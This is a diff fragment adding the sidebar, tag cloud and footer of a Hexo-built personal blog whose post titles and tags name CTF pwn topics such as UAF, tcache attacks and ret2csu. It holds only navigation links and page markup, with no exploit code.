+            <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2025/04/20/ORW2/">ORW2</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/20/%E7%AE%80%E5%8D%95ORW%E5%88%9D%E6%8E%A2/">简单ORW初探</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/20/2-34-%E9%AB%98%E7%89%88%E6%9C%AClibc-safe-linking-%E5%88%9D%E4%BD%93%E9%AA%8C-%E8%A2%AB%E6%81%B6%E5%BF%83%E6%AD%BB%E4%BA%86/">2.34 高版本libc safe-linking 初体验 (被恶心死了)</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/20/%E5%85%A5%E9%97%A8%E7%9A%84UAF/">入门的UAF</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/20/tcache%E4%BA%8C%E6%AC%A1%E5%B7%A9%E5%9B%BA-malloc-hook-onegadget/">tcache二次巩固 + __malloc_hook + onegadget</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/20/%E5%85%B7%E6%9C%89key%E7%9A%84%E9%AB%98%E7%89%88%E6%9C%ACtcache-attack%E5%88%9D%E4%BD%93%E9%AA%8C/">具有key的高版本tcache attack初体验</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/20/ret2csu-%E7%AC%AC%E4%B8%80%E6%AC%A1%E8%A7%A3%E7%AD%94/">ret2csu 第一次解答</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/20/%E7%AE%80%E5%8D%95%E7%9A%84%E5%A0%86%E6%BA%A2%E5%87%BA/">简单的堆溢出</a></li></ul>
+        </div>
+        
+
+        
+        <div class="widget-tags widget" style="order: 2 ">
+            <h2 class="widget-title"><i class="fa fa-tags"></i> 标签</h2>
+            <a href="/tags/malloc-hook/" style="font-size: 12px;">_malloc_hook</a> <a href="/tags/glibc/" style="font-size: 16px;">glibc</a> <a href="/tags/heap/" style="font-size: 18px;">heap</a> <a href="/tags/off-by-one/" style="font-size: 10px;">off-by-one</a> <a href="/tags/one-gadget/" style="font-size: 10px;">one_gadget</a> <a href="/tags/orw/" style="font-size: 12px;">orw</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/tags/ret2csu/" style="font-size: 10px;">ret2csu</a> <a href="/tags/ret2shellcode/" style="font-size: 10px;">ret2shellcode</a> <a href="/tags/ret2text/" style="font-size: 10px;">ret2text</a> <a href="/tags/safe-linking/" style="font-size: 10px;">safe-linking</a> <a href="/tags/shellcode/" style="font-size: 12px;">shellcode</a> <a href="/tags/stack/" style="font-size: 12px;">stack</a> <a href="/tags/tcache/" style="font-size: 14px;">tcache</a> <a href="/tags/uaf/" style="font-size: 10px;">uaf</a> <a href="/tags/%E4%B8%96%E7%95%8C%E6%9D%AF/" style="font-size: 12px;">世界杯</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2/" style="font-size: 10px;">数据泄露</a>
+        </div>
+        
+
+        
+        <div class="widget-categories widget" style="order: 3 ">
+            <h2 class="widget-title"><i class="fa fa-folder-open"></i> 分类</h2>
+            
+        </div>
+        
+
+    </div>
+</section>
+
+</div>
+
+
+
+
+    
+        <footer class="footer">
+	<p class="footer-intro">
+		
+		@2025 My Blog.
+	</p>
+	<p class="footer-intro">
+			Powered By <a href="https://hexo.io/zh-cn/" target="_blank">hexo</a>
+			theme <a href="https://github.com/iengu/hexo-theme-mokusei" target="_blank">mokusei</a> by <a href="https://www.iengu.com" target="blank">iengu</a>
+	</p>
+</footer>
+
+
+
+
+        <div class="extend-tools" id="extend-tools" style="display: none;">
+    <ul>
+        <li class="tools-returnTop" title="返回顶部"><i class="fa fa-angle-double-up"></i></li>
+    </ul>
+</div>
+
+	</div>
+
+	
+<script src="/js/org/jquery.min.js"></script>
+
+    
+<script src="/js/extend.js"></script>
+
+</body>
+</html>
